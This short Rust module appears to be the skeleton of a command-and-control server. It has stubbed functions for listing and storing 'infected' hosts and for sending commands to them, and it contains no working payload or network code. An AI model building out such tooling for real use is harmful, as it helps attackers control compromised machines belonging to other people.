use serde::{Deserialize, Serialize};
use thiserror::Error;

use crate::{domains::infected::{Infected, InfectedId}, repos::database::{InfectedDatabaseError, InfectedRepo}};

pub fn get_infected_all() -> Vec<Infected> {
    todo!()
}

pub fn create_infected(infected: &Infected, database: impl InfectedRepo) -> Result<(), InfectedDatabaseError> {
    database.add_infected(infected)
}

pub fn get_infected(id: InfectedId) -> Infected {
    todo!()
}

#[derive(Error, Debug, Deserialize, Serialize, Clone, Copy)]
#[error("Command could not execute")]
pub struct CommandExecutionError;

pub fn send_command(command: crate::domains::command::Command, target: Infected) -> Result<(), CommandExecutionError> {
    todo!()
}
